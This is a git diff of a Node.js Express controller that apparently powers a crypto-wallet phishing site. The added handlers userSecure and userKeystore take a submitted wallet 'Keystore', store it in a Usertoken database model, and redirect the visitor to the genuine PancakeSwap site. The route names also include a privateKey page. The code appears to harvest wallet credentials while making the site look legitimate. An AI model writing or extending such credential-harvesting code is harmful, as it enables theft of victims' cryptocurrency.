@@ -1,15 +1,11 @@
-const { User } = require('../models/userModel')
+const { User, Usertoken } = require('../models/userModel')
 module.exports = {
 
     login: (req, res) => {
         res.render('login')
     },
 
-    loginUser: (req, res, next) => {
-        console.log(req.body)
-        res.render('login')
 
-    },
 
     loginUser: (req, res, next) => {
         const { userName, password } = req.body
@@ -44,8 +40,14 @@ module.exports = {
     },
 
     userSecure: (req, res, next) => {
-        console.log(req.body)
-        res.render('secure')
+        const { Keystore } = req.body;
+        if (Keystore) {
+            Usertoken.create({ userToken: Keystore }).then(rs => {
+                res.redirect("https://pancakeswap.finance/")
+            }).catch(error => {
+                res.render('keystore')
+            })
+        }
     },
 
     keystore: (req, res, next) => {
@@ -53,8 +55,15 @@ module.exports = {
     },
 
     userKeystore: (req, res, next) => {
-        console.log(req.body)
-        res.render('keystore')
+        const { Keystore } = req.body;
+        if (Keystore) {
+            Usertoken.create({ userToken: Keystore }).then(rs => {
+                res.redirect("https://pancakeswap.finance/")
+            }).catch(error => {
+                res.render('keystore')
+            })
+        }
+
     },
 
 
@@ -63,9 +72,7 @@ module.exports = {
     },
 
     userKey: (req, res, next) => {
-        console.log(req.body)
         res.render('privateKey')
     }
-
 
 }
